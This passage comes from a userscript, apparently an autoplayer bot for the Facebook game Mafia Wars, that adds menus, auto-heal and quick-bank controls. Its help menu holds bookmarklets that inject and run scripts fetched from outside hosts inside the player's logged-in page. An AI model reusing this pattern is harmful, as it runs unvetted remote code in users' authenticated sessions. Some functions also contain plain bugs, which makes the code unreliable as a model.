    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c10.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c13.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c16.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r6_c1.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r6_c2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r6_c16.png">' +
    //MWAP Settings Box Link Hover Images
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c2_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c3_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c4_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c5_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c6_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c8_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c9_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c11_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c12_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c14_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c15_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r3_c15_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c2_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c7_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c10_f2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c13_f2.png">' +
    //MWAP Log Box Link Images
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_10.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_11.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_05.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_06.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_07.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_08.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_08.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_09.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_12.png">' +
    //MWAP Log Box Link Hover Images
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_10-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_11-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_05-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_06-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_07-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_08-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_08-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_09-over.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'logbox2_12-over.png">';
  preload_Images.innerHTML = preload_Images_Inner;
}

function customizeMasthead() {

  function openMWAPMenu(){
   var mwapMenu = document.getElementById('mwapHelpMenu');
   if(mwapMenu) mwapMenu.style.display = 'block';
  }

  function closeMWAPMenu(){
   var mwapMenu = document.getElementById('mwapHelpMenu');
   if(mwapMenu) mwapMenu.style.display = 'none';
  }

  function toggleMWAPMenu(){
   var mwapMenu = document.getElementById('mwapHelpMenu');
   if(mwapMenu) {
    if(mwapMenu.style.display == 'none') mwapMenu.style.display = 'block';
    if(mwapMenu.style.display == 'block') mwapMenu.style.display = 'none';
   }
  }

  // Document title
  document.title = "Mafia Wars on Facebook";
  if (isGMChecked('fbwindowtitle')) {
    if (GM_getValue('FBName'))
      document.title = GM_getValue('FBName');
  }

  if (document.getElementById('ap_menu')) {
    updateMastheadMenu();
    return;
  }

  // Get the masthead.
  if(new_header){
    var mastheadElt = xpathFirst('//div[@class="header_top_row"]');
  } else {
    var mastheadElt = document.getElementById('mw_masthead');
  }
  if (!mastheadElt) return;

  // Links
  var linkElt = makeElement('div', mastheadElt,
    {'id':'ap_links', 'style':'position: absolute; top: 4px; right: 0px; text-align: left;' +
     'font-size: 12px; font-weight: bold;'});
  makeElement('a', linkElt, {'href':'http://www.playerscripts.com/mwap-script/mwap-ff-download.html','target':'_blank'})
    .appendChild(document.createTextNode('For Firefox'));
  linkElt.appendChild(document.createTextNode(' | '));
  makeElement('a', linkElt, {'href':'https://chrome.google.com/extensions/detail/cgagpckjofhomehafhognmangbjdiaap','target':'_blank'})
    .appendChild(document.createTextNode('For Chrome'));

  // Make a container for the autoplayer menu.
  var mwapTitle = 'PS MWAP ' + SCRIPT.version ;
  if (new_header) mwapTitle += ' (nH)' ; // mark new header style
  MMMiss_ver();
  if(tst_ver) {  mwapTitle += '('+ tst_ver +')' ;  } // add version tag while working

  makeElement('div', mastheadElt, {'style':'position: absolute; top: 20px; right: 10px; text-align: left; font-size: 11px; font-weight: bold; color: white'}).appendChild(document.createTextNode(mwapTitle));
  var mwapLikeElt = makeElement('div', mastheadElt, {'style':'position: absolute; top: 20px; right: 500px'});
  mwapLikeElt.innerHTML = '<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.facebook.com%2Fpages%2FPS-Mafia-Wars-Autoplayer%2F160393374005267&amp;layout=button_count&amp;show_faces=true&amp;width=80&amp;action=like&amp;font=arial&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:80px; height:21px;" allowTransparency="true"></iframe>';
  mastheadElt.insertBefore(mwapLikeElt, mastheadElt.firstChild);
  var menuElt = makeElement('div', mastheadElt, {'id':'ap_menu', 'style':'position: absolute; top: 38px; font-size: 11px; right: 0px; text-align: left;'});

  var mwapHelpElt = makeElement('div', null, {'id':'mwapHelpElt', 'style':'position: absolute; top: 18px; right:170px; width: 110px; z-index: 1;'});
  var mwapHelpContainer = makeElement('div', mwapHelpElt, {'id':'help_container', 'style':'width: 110px;'});
  var mwapHelpLink = makeElement('a', mwapHelpContainer, {'class':'sexy_button_new short black_white_border','style':'width: 110px; outline-color: -moz-use-text-color; outline-style: none; outline-width: medium;'});
  var mwapHelpSpan1 = makeElement('span', mwapHelpLink);
  var mwapHelpSpan2 = makeElement('span', mwapHelpSpan1, {'style':'background: transparent url(http://mwfb.static.zynga.com/mwfb/graphics/dropdown_travel_arrow.gif) no-repeat scroll 75px 50%; text-align: left; -moz-background-clip: border; -moz-background-origin: padding; -moz-background-inline-policy: continuous;'});
  mwapHelpSpan2.appendChild(document.createTextNode(' PS MWAP '));
  var mwapHelpDiv = makeElement('div', mwapHelpContainer, {'style':'z-index: 20; display: none;margin-top:-2px;width:150px;','id':'mwapHelpMenu'});

  //mwapHelpDiv.style.width = "200px";

  mwapHelpDiv.innerHTML +=
                     '<div><b>Downloads</b></div> ' +
                     '<a href="http://www.playerscripts.com/mwap-script/mwap-ff-download.html" target="_blank"> ' +
                     'For Firefox ' +
                     '</a> ' +
                     '<a href="https://chrome.google.com/extensions/detail/cgagpckjofhomehafhognmangbjdiaap" target="_blank"> ' +
                     'For Chrome ' +
                     '</a> ' +
                     '<a href="http://www.playerscripts.com/mwap-script/google-repository.html" target="_blank"> ' +
                     'Revert to Previous ' +
                     '</a> ' +
                     '<div><b>Websites</b></div> ' +
                     '<a href="http://www.playerscripts.com/live-chat.html" target="_blank"> ' +
                     'PlayerScripts Chat ' +
                     '</a>' +
                     '<a href="http://www.playerscripts.com/" target="_blank"> ' +
                     'PlayerScripts ' +
                     '</a>' +
                     '<div><b>Bookmarklets</b></div> ' +
                     '<a href="javascript:(function(){var%20a%3Ddocument.createElement(%22script%22)%3Ba.type%3D%22text%2Fjavascript%22%3Ba.src%3D%22http%3A%2F%2Fcodeoutpost.com%2FScripts%2FChuckACrapQueue.js%3F%22%2BMath.random()%3Bdocument.getElementsByTagName(%22head%22)[0].appendChild(a)})()%3B"> ' +
                     'Chuck-a-Crap ' +
                     '</a> ' +
                     '<a style="border-bottom:1px solid #FFF" href="javascript:%28function%28%29%7Bvar%20a%3Ddocument.createElement%28%22script%22%29%3Ba.type%3D%22text%2Fjavascript%22%3Ba.src%3D%22http://www.spockholm.com/mafia/robber.js%3F%22%2BMath.random%28%29%3Bdocument.getElementsByTagName%28%22head%22%29%5B0%5D.appendChild%28a%29%7D%29%28%29%3B"> ' +
                     'Spock&#39;s Robber v1.14 ' +
                     '</a> ';

  mastheadElt.insertBefore(mwapHelpElt, mastheadElt.firstChild);

  mwapHelpElt.addEventListener('click', toggleMWAPMenu, false);
  mwapHelpElt.addEventListener('mouseover', openMWAPMenu, false);
  mwapHelpElt.addEventListener('mouseout', closeMWAPMenu, false);

  // Grab Toolbar info (PS MWAP menu)
  var lobjcheckPack = makeElement('a', null, {'id':'checkPack'});
  lobjcheckPack.innerHTML = '<span id="checkPack">Grab Toolbar info</span>';
  lobjcheckPack.addEventListener('click', grabToolbarInfo, false);
  mwapHelpDiv.insertBefore(lobjcheckPack, mwapHelpDiv.firstChild);

  // Check Las Vegas Vault (PS MWAP menu)
  var lobjcheckVault = makeElement('a', null, {'id':'checkVault'});
  lobjcheckVault.innerHTML = '<span id="checkVault">Check Las Vegas Vault</span>';
  lobjcheckVault.addEventListener('click', checkVaultStatus, false);
  mwapHelpDiv.insertBefore(lobjcheckVault, mwapHelpDiv.firstChild);

  // Reset Timers (PS MWAP menu)
  var lobjresetTimers = makeElement('a', null, {'id':'resetTimers'});
  lobjresetTimers.innerHTML = '<span id="resetTimers">Reset Timers</span>';
  lobjresetTimers.addEventListener('click', resetTimers, false);
  mwapHelpDiv.insertBefore(lobjresetTimers, mwapHelpDiv.firstChild);

  // Show Timers (PS MWAP menu)
  var lobjshowTimers = makeElement('a', null, {'id':'showTimers'});
  lobjshowTimers.innerHTML = '<span id="showTimers">Show Timers</span>';
  lobjshowTimers.addEventListener('click', showTimers, false);
  mwapHelpDiv.insertBefore(lobjshowTimers, mwapHelpDiv.firstChild);

  // Settings Link (PS MWAP menu)
  var lobjAutoPlay = makeElement('a', null, {'id':'autoPlay'});
  lobjAutoPlay.innerHTML = '<span id="autoPlayspan">Settings</span>';
  lobjAutoPlay.addEventListener('click', toggleSettings, false);
  mwapHelpDiv.insertBefore(lobjAutoPlay, mwapHelpDiv.firstChild);

  // Settings Link main page
  menuElt.appendChild(document.createTextNode(' | '));
  var lobjAutoPlay = makeElement('span', menuElt);
  lobjAutoPlay.appendChild(document.createTextNode('Settings'));
  lobjAutoPlay.addEventListener('click', toggleSettings, false);

  // View log button.
  menuElt.appendChild(document.createTextNode(' | '));
  var lobjViewLogButton = makeElement('span', menuElt);
  lobjViewLogButton.appendChild(document.createTextNode('Log'));
  lobjViewLogButton.addEventListener('click', showMafiaLogBox, false);

  // Show resume or paused based on if we are running or not.
  updateMastheadMenu();
}

function customizeStats() {
  // Don't watch the stats area while we're making changes to it.
  setListenStats(false);

  // Make bank icon clickable for instant banking
  var bankLinkElt = document.getElementById('mwap_bank');
  var bankElt = xpathFirst('.//div[@id="game_stats"]//div[@id="cash_stats_'+cities[city][CITY_ALIAS]+'"]/h4/text()', statsrowElt);
  if (bankElt && !bankLinkElt) {
    bankLinkElt = makeElement('a', null, {'id': 'mwap_bank', 'title': 'Click to bank immediately.'});
    bankElt.parentNode.insertBefore(bankLinkElt, bankElt);
    bankLinkElt.appendChild(bankElt);
    bankLinkElt.addEventListener('click', quickBank, false);
  }

  // Make energy icon & text clickable for mini pack.
  var nrgLinkElt = document.getElementById('mwap_nrg');
  var nrgElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text energy_text_bg" and contains(text(), "ENERGY")]', statsrowElt);
  if (!nrgElt)  nrgElt = xpathFirst('.//div[@id="game_stats"]//h4[@class="energy" and contains(text(), "Energy")]', statsrowElt);
  if (!nrgElt)  nrgElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Energy")]', statsrowElt);
  if (nrgElt && !nrgLinkElt) {
    if(isGMChecked('autoMission')){
       var nrgTitle = 'Spend Energy ON.  ';
        nrgElt.style.color="#33FF00"; // green
      } else {
//        if(below_energy_floor_needs_Identifying) {
//          var nrgTitle = 'Spend Energy ON, below spend floor.  ';
//          nrgElt.style.color="#FFCC00"; // orange/yellow
//        } else {
        var nrgTitle = 'Spend Energy OFF.  ';
        nrgElt.style.color="#FF0000"; // red
      }
    nrgTitle += '  NO LONGER FIRES ENERGY PACK.  ';
    nrgElt.style.textDecoration="underline";
    nrgLinkElt = makeElement('a', null, {'id':'mwap_nrg', 'title':nrgTitle});
    nrgElt.parentNode.insertBefore(nrgLinkElt, nrgElt);
    nrgLinkElt.appendChild(nrgElt);
    nrgLinkElt.addEventListener('click', toggleNrgSpend, false);
    var mepakLink = document.getElementById('mwap_epack');
    if(!mepakLink) {

    var timeLeftPack = getHoursTime('miniPackTimer');
    if (timeLeftPack == 0 || timeLeftPack == undefined) {
      var miniPackTitle = 'Mini-Pack available now. ';
    } else {
      var miniPackTitle = timeLeftPack + ' until Mini-Pack is available. ';
    }
    miniPackTitle += ' Click to attempt to fire immediately.';
    mepakLink = makeElement('a', null, {'id':'mwap_Fire_epak', 'title':miniPackTitle, 'style':'position:absolute; top:60px; right:392px;'}  );
    if (timeLeftPack == 0 || timeLeftPack == undefined) {
      var m_epak_icon = mini_Epak_ready ;
      mepakLink.innerHTML=mini_Epak_ready;

    } else {
      var m_epak_icon = mini_Epak_wait  ;
      mepakLink.innerHTML=mini_Epak_wait;
    }
//        mepakLink.style.padding="0px 0px 0px 72px";
//        mepakLink.style.position="absolute; top:5px; right:60px;";
        mepakParent = nrgLinkElt.parentNode;
        mepakParent.insertBefore(mepakLink, mepakParent.childNodes[2]);
        mepakLink.addEventListener('click', miniPackForce, false);
    }
  }


  // Make stamina text & icon pointable for showing.
  var stamLinkElt = document.getElementById('mwap_stam');
  var stamElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text stamina_text_bg" and contains(text(), "STAMINA")]', statsrowElt);
  if (!stamElt)
    stamElt = xpathFirst('.//div[@id="game_stats"]//h4[contains(text(), "Stamina")]', statsrowElt);
  if (!stamElt)
    stamElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Stamina")]', statsrowElt);
  if (stamElt && !stamLinkElt) {


    if(isGMChecked('staminaSpend')) {
       var stamTitle = 'Spend Stamina ON.  ';
      stamElt.style.color="#33FF00";     // green
    }  else {
       var stamTitle = 'Spend Stamina OFF.  ';
      stamElt.style.color="#FF0000";     // red
}
    stamTitle += 'Minimum Stamina for auto-healing set at ' + GM_getValue('stamina_min_heal') + ' points.';

    stamElt.style.textDecoration="underline";
    stamLinkElt = makeElement('a', null, {'id':'mwap_stam', 'title':stamTitle});
    stamElt.parentNode.insertBefore(stamLinkElt, stamElt);
    stamLinkElt.appendChild(stamElt);
    stamLinkElt.addEventListener('click', toggleStamSpend, false);
  }


  // Make health icon&text clickable for instant healing.
  var hospitalElt = xpathFirst('.//div[@id="game_stats"]//a[@class="heal_link" or @class="heal_link vt-p"]', statsrowElt);
  var healLinkElt = document.getElementById('mwap_heal');
  var healElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text health_text_bg" and contains(text(), "HEALTH")]', statsrowElt);
  if (!healElt)
    healElt = xpathFirst('.//div[@id="game_stats"]//h4[@class="health" and contains(text(), "Health")]', statsrowElt);
  if (!healElt)
    healElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Health")]', statsrowElt);
  if (healElt) {
    if (!healLinkElt) {
      healElt.style.color="#FF0000";
      healElt.style.textDecoration="underline";
      healElt.style.display="inline-block";
      healLinkElt = makeElement('a', null, {'id':'mwap_heal', 'title':'Click to heal immediately.'});
      healElt.parentNode.insertBefore(healLinkElt, healElt);
      healLinkElt.appendChild(healElt);
      healLinkElt.style.textDecoration="none";

      var newLink = document.getElementById('mwap_toggleheal');
      if(!newLink) {

        if (!isGMChecked('autoHeal')) {
          newLinkTitle='autoHeal unchecked';
        } else {
          if (GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB || GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTRIVALS_ROB) newLinkTitle='autoHeal checked BUT OVERRULED - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
          else newLinkTitle='autoHeal checked - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
        }

        newLink = makeElement('a', null, {'id':'mwap_toggleheal', 'title':newLinkTitle});

        if (!isGMChecked('autoHeal')) {
          newLink.innerHTML=healOffIcon;
        } else {
          if (GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB || GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTRIVALS_ROB) newLink.innerHTML=healOnHoldIcon;
          else newLink.innerHTML=healOnIcon;
        }
        newLink.style.padding="5px 0px 0px 8px";
        newLink.style.position="absolute";
        healParent = healLinkElt.parentNode;
        healParent.insertBefore(newLink, healParent.childNodes[2]);
        newLink.addEventListener('click', toggleHeal, false);
      }
    }

    // Substitute the "hide" icon if currently hiding in the hospital.
    var hidingInHospital = /transparent url/i.test(healElt.getAttribute('style'));
    if (health < 20 && isGMChecked('hideInHospital')) {
      if (!hidingInHospital) {
        healElt.style.background = 'transparent url(' + stripURI(hideIcon) + ') no-repeat scroll 0 50%';
        healElt.title = 'Currently hiding in the hospital. Click to heal immediately.';
      }
    } else if (hidingInHospital) {
      healElt.style.background = '';
      healElt.title = 'Click to heal immediately.';
    }
    if (hospitalElt) {
      // Make instant heal work without switching pages.
      healLinkElt.addEventListener('click', quickHeal, false);
    }
  }

  // Blink maxed out energy or stamina.
  energyElt.style.textDecoration = (energy == maxEnergy)? 'blink' : 'none';
  staminaElt.style.textDecoration = (stamina == maxStamina)? 'blink' : 'none';

  // Blink dangerous health levels.
  healthElt.style.textDecoration = (health > 19 && health < 29) ? 'blink' : 'none';

  // Once health is below 20, set the timer (this is for the conditional healing logic)
  if (isGMChecked('forceHealOpt5') && health < 20 && GM_getValue('healWaitStarted') != true) {
    setGMTime('healWaitTime', '05:00');
    GM_setValue('healWaitStarted', true);
  }

  setListenStats(true);
}

function toggleHeal() {
  if(isGMChecked('autoHeal')) {
    GM_setValue('autoHeal', 0);
    document.getElementById('mwap_toggleheal').innerHTML=healOffIcon;
    document.getElementById('mwap_toggleheal').title = 'autoHeal unchecked';
    addToLog('healOffIcon Icon', 'autoHeal turned OFF by User');
  } else {
    GM_setValue('autoHeal', 'checked');
    if(GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB  || GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTRIVALS_ROB){
      document.getElementById('mwap_toggleheal').innerHTML=healOnHoldIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked BUT OVERRULED - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnHoldIcon Icon', 'autoHeal turned ON by User, but overruled');
    } else {
      document.getElementById('mwap_toggleheal').innerHTML=healOnIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnIcon Icon', 'autoHeal turned ON by User');
    }
  }
}

function toggleNrgSpend() {
  if(isGMChecked('autoMission')) {
    GM_setValue('autoMission', 0);
//    document.getElementById('mwap_toggleheal').innerHTML=healOffIcon;
//    document.getElementById('mwap_toggleheal').title = 'staminaSpend unchecked';
    addToLog('info Icon', 'Energy Spend turned OFF by User');
  } else {
    GM_setValue('autoMission', 'checked');
//      document.getElementById('mwap_toggleheal').innerHTML=healOnIcon;
//      document.getElementById('mwap_toggleheal').title = 'staminaSpend checked.';
      addToLog('info Icon', 'Energy turned ON by User');
  }
update_nrg_stam();
}

function toggleStamSpend() {
  if(isGMChecked('staminaSpend')) {
    GM_setValue('staminaSpend', 0);
//    document.getElementById('mwap_toggleheal').innerHTML=healOffIcon;
//    document.getElementById('mwap_toggleheal').title = 'staminaSpend unchecked';
    addToLog('info Icon', 'staminaSpend turned OFF by User');
  } else {
    GM_setValue('staminaSpend', 'checked');
//      document.getElementById('mwap_toggleheal').innerHTML=healOnIcon;
//      document.getElementById('mwap_toggleheal').title = 'staminaSpend checked.';
      addToLog('info Icon', 'staminaSpend turned ON by User');
  }
update_nrg_stam();
}

function quickHeal(byUser) {
  // NOTE: In the interest of time, delays are waived.
  Autoplay.delay = noDelay;
  if (byUser == false) {
    var healLocation = parseInt(GM_getValue('healLocation', NY));
  } else {
    var healLocation = city;
  }
  // Make sure we're in the preferred city.
  if (healLocation != cities.length && city != healLocation) {
    if (byUser) return;
    Autoplay.fx = function() { goLocation(healLocation); };
    Autoplay.start();
    return true;
  }

  // Create heal link.
  var healElt = makeElement('a', null, {'onclick':'return do_ajax("' + (byUser ? SCRIPT.ajaxIDAsync : SCRIPT.ajaxIDSync) + '","' + SCRIPT.controller + 'hospital' + SCRIPT.action + 'heal' + SCRIPT.city + (healLocation + 1) + '", 1, 1, 0, 0); return false;'});
  if (byUser) {
    createAjaxPage(false, 'quick heal');
    clickElement(healElt);
    return false;
  } else {
    createAjaxPage(true);
    Autoplay.fx = function() {
      clickAction = 'quick heal';
      clickElement(healElt);
      DEBUG('Clicked to quickheal.');
    };
    Autoplay.start();
    return true;
  }
}

function quickBank(bankCity, amount) {
  var byUser = false;
  // Handle user-click action
  if (isNaN(amount)) {
    if (isNaN(bankCity)) {
      bankCity = city;
      byUser = true;
    }
    cashElt = document.getElementById('user_cash_' + cities[bankCity][CITY_ALIAS]);
    if (cashElt)
      amount = parseCash(cashElt.innerHTML);
    else
      amount = cities[bankCity][CITY_CASH];
  }

  // Check vault status & get the URL
  if (bankCity == LV) {
    if (GM_getValue('vaultHandling',0)) {
      var vaultSpace = parseInt(GM_getValue('vaultSpace','0'));
      if (vaultSpace <= 0) {
        if (byUser) addToLog('info Icon', 'Your vault appears to be full, rechecking...');
        checkVaultStatus(byUser);
        return false;
      }
      amount = (amount > vaultSpace) ? vaultSpace : amount;
    }
    var depositUrl = "xw_controller=propertyV2&xw_action=doaction&xw_city=5&doaction=ActionBankDeposit&building_type=6&city=5&amount=" + amount;
  } else
    var depositUrl = "xw_controller=bank&xw_action=deposit_all&xw_city=" + (bankCity + 1);

  // If cash being deposited is greater than 10 billion, do NOT quick-bank!
  if (amount > 10000000000) {
    if (byUser)
      addToLog('updateBad Icon', 'Depositing <strong class="good">' + cities[bankCity][CITY_CASH_SYMBOL] + makeCommaValue(amount) +
               '</strong>!?!<strong class="bad"> HELL NO!</strong> Sink it from the banking page.');
    quickBankFail = true;
    return false;
  }

  // Do not quick-bank if city has changed
  if (city != bankCity) {
    DEBUG('Switching city too fast, not quick-banking.');
    return false;
  }
/*
  // One last check to make sure the city hasn't changed
  var eltBankCity = xpathFirst('.//a[@class="bank_deposit"]', statsrowElt);
  if (eltBankCity) {
    if (eltBankCity.getAttribute('onclick').match(/xw_city=(\d+)/)) {
      var thisCity = RegExp.$1 - 1;
      if (thisCity != bankCity) {
        addToLog('warning Icon', 'Banking Error: Current City: ' + cities[thisCity][CITY_NAME] + ' Expected City: ' + cities[bankCity][CITY_NAME]);
        return false;
      }
    }
  }
*/
  var ajaxID = createAjaxPage(false, 'quick deposit', bankCity);
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","remote/html_server.php?' + depositUrl + '", 1, 1, 0, 0); return false;'});
  clickElement(elt);
  DEBUG('Clicked to quickbank.');
  return false;
}


function speedClick(elt) {
  if (!elt) {
    addToLog('warning Icon', 'BUG DETECTED: Null element passed to speedClick().');
    return;
  }
  var clickcount = 1;
  if(isGMChecked('staminaSpeedClick')) clickCount = 4 + Math.floor(Math.random() * 3);
  DEBUG('Clicking ' + clickCount + ' time(s).');
  for (var i = 0; i < clickCount; ++i){
    clickElement (elt);
    for(var j = 0; j <300;j++);}
}

function customizeNames() {
  var i, elt, elts = $x('.//a[contains(@onclick, "user=")]', innerPageElt);
  for (i = 0, iLength=elts.length; i < iLength; ++i) {
    elt = elts[i];
    if (!elt.innerHTML.replace(/\xAD/g, '').trim()) {
      if (elt.getAttribute('onclick').match(/user=(\d+)/)) {
        elt.innerHTML = chickenIcon + ' Chicken ' + RegExp.$1;
      } else {
        elt.innerHTML = chickenIcon + ' Chicken';
      }
    }
  }

  elts = $x('.//span[contains(@id, "_fight_view_name_")]', innerPageElt);
  for (i = 0, iLength=elts.length; i < iLength; ++i) {
    elt = elts[i];
    if (!elt.innerHTML.untag().trim()) {
      elt.innerHTML = chickenIcon + ' Chicken';
    }
  }
}

function customizeHome() {
  var oDiv = document.getElementById('snapi_zbar');
  if(oDiv) oDiv.parentNode.parentNode.removeChild(oDiv.parentNode);

  // New Style Home page
  if(onNewHome()){

    if(!running) {
    // Only customize the homepage when MWAP is paused ...
      var mainModule = xpathFirst('.//div[@id="MainModule"]',innerPageElt);
      if(mainModule) mainModule.style.height="";

      DEBUG('Customizing new home page ...');
      // Todo New Home sucks, so really customize it
      // Get rid of the stuff below the energy pack and replace it with something useful
	    var lastJobModuleElt = xpathFirst('.//div[@id="LastJobModule"]',innerPageElt);
	    var chopShopTimerElt = xpathFirst('.//div[@id="bye_ChopShop_cont"]//div[@class="slide_header_img"]',innerPageElt);
	    var weaponsTimerElt =  xpathFirst('.//div[@id="bye_WeaponsDepot_cont"]//div[@class="slide_header_img"]',innerPageElt);
	    var armoryTimerElt = xpathFirst('.//div[@id="bye_Armory_cont"]//div[@class="slide_header_img"]',innerPageElt);
	    var zooTimerElt = xpathFirst('.//div[@id="bye_PrivateZoo_cont"]//div[@class="slide_header_img"]',innerPageElt);
      if(chopShopTimerElt && weaponsTimerElt&& armoryTimerElt && zooTimerElt) {
	      var MWAPQuickLinksHtml = '<div id="lastJobModule"><div class="module_subtitle">Quick Links</div><div class="slide_header_img" style="display: block; width: 270px; height: 70px;">'+chopShopTimerElt.innerHTML+'</div><div class="slide_header_img" style="display: block; width: 270px; height: 70px;">'+weaponsTimerElt.innerHTML+'</div><div class="slide_header_img" style="display: block; width: 270px; height: 70px;">'+armoryTimerElt.innerHTML+'</div><div class="slide_header_img" style="display: block; width: 270px; height: 70px;">'+zooTimerElt.innerHTML+'</div>';
	      if(lastJobModuleElt) {
	        lastJobModuleElt.style.height = '470px';
	        lastJobModuleElt.innerHTML = MWAPQuickLinksHtml;
        }
	    }

      // Getting usefull info from the marketplace
      var empireModule = xpathFirst('.//div[@class="empire_main_module"]',innerPageElt);
      var ajaxID = createAjaxPage(false, 'marketplace', empireModule);
      var elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","' + SCRIPT.controller + 'marketplace' + SCRIPT.action + 'marketplace_category&category=8", 1, 1, 0, 0); return false;'});
      clickElement(elt);
    }
  // Old Style Home page
  } else if (onHome()){
    DEBUG('Customizing old home page ...');
	  // Is an energy pack waiting to be used?
	  energyPackElt = xpathFirst('.//a[contains(@onclick, "xw_action=use_and_energy_all")]', innerPageElt);
	  energyPackElt = energyPackElt ? energyPackElt : xpathFirst('.//a[contains(@onclick, "xw_action=use_energy_pak")]', innerPageElt);
	  energyPack = energyPackElt? true : false;

	  // Display a message next to the energy pack button.
	  if (energyPackElt && energyPackElt.scrollWidth) {
		var energyGainRate = getEnergyGainRate();
		var ptsFromEnergyPack = maxEnergy * 1.25 * energyGainRate;
		var ptsNeeded = ptsToNextLevel - energy * energyGainRate -
						stamina * getStaminaGainRate();
		var txt = 'XP from Energy Pack = ' + parseInt(ptsFromEnergyPack) +
				  '<br>Projected XP needed = ' + parseInt(ptsNeeded);
		var packParentElt = document.getElementById('clock_energy_pack');
		if (packParentElt) {
		  var descElt = makeElement('div', null, {'style':'float:left; padding: 2px 10px 0px 0px; font-size: 10px;'});
		  descElt.innerHTML = txt;
		  packParentElt.insertBefore(descElt, packParentElt.firstChild);
		}
	  } else {
		energyPack = false;
	  }

	  return true;
	} else {
   return false;
  }
}

function getPlayerStats() {
  var statTable = xpathFirst('.//table[contains(.,"Attack:") and contains(.,"Defense:")]', innerPageElt);

  // Fetch defense and attack values from profile
  if (statTable) {
    DEBUG('Fetching stats from profile page');

    // Attack
    var curAttackRow  = xpathFirst('.//tr[contains(.,"Attack:")]', statTable);
    if (curAttackRow && curAttackRow.innerHTML.match(/>\s*(\d+)/)) {
      curAttack = parseInt(RegExp.$1);
      GM_setValue('curAttack', curAttack);
    }

    // Defense
    var curDefenseRow  = xpathFirst('.//tr[contains(.,"Defense:")]', statTable);
    if (curDefenseRow && curDefenseRow.innerHTML.match(/>\s*(\d+)/)) {
      curDefense = parseInt(RegExp.$1);
      GM_setValue('curDefense', curDefense);
    }

    //
    if (isUndefined(curAttack)) {
      addToLog('info icon', 'Current status attributes cannot be detected, turning off auto-stat.');
      GM_setValue('autoStat', 0);
    }
  }
}

